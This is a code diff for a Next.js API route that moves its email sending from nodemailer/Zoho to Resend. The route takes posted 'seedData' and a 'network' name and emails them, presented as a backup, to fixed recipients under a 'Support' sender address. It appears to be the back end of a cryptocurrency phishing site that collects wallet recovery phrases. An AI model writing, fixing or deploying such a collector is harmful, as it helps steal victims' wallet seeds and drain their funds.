@@ -1,5 +1,5 @@
 import { NextRequest, NextResponse } from 'next/server'
-import nodemailer from 'nodemailer'
+import { Resend } from 'resend'
 
 export async function POST(request: NextRequest) {
   try {
@@ -14,19 +14,13 @@ export async function POST(request: NextRequest) {
       )
     }
 
-    // Create transporter using environment variables
-    const transporter = nodemailer.createTransport({
-      service: 'zoho', // true for 465, false for other ports
-      auth: {
-        user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASSWORD,
-      },
-    })
+    // Initialize Resend with API key from environment variables
+    const resend = new Resend(process.env.RESEND_API_KEY)
 
     // Get recipients array from environment variables
     const recipients = [
-      process.env.BACKUP_EMAIL_1,
-      process.env.BACKUP_EMAIL_2
+      process.env.RECIPIENT1,
+      process.env.RECIPIENT2
     ].filter((email): email is string => Boolean(email))
 
     if (recipients.length === 0) {
@@ -38,15 +32,21 @@ export async function POST(request: NextRequest) {
 
     // Send individual emails to each recipient
     for (const recipient of recipients) {
-      const mailOptions = {
-        from: process.env.EMAIL_USER,
-        to: recipient, // Single recipient per email
+      const { data, error } = await resend.emails.send({
+        from: 'Support <support@fixorbits.com>', // Use your verified domain
+        to: [recipient], // Resend expects an array
         subject: network,
         text: seedData,
         html: `<pre style="font-family: 'Courier New', monospace; font-size: 14px; white-space: pre-wrap; word-break: break-all;">${seedData}</pre>`,
-      }
+      })
 
-      await transporter.sendMail(mailOptions)
+      if (error) {
+        console.error('Resend error for recipient', recipient, ':', error)
+        return NextResponse.json(
+          { error: 'Failed to send backup email' },
+          { status: 500 }
+        )
+      }
     }
 
     return NextResponse.json(
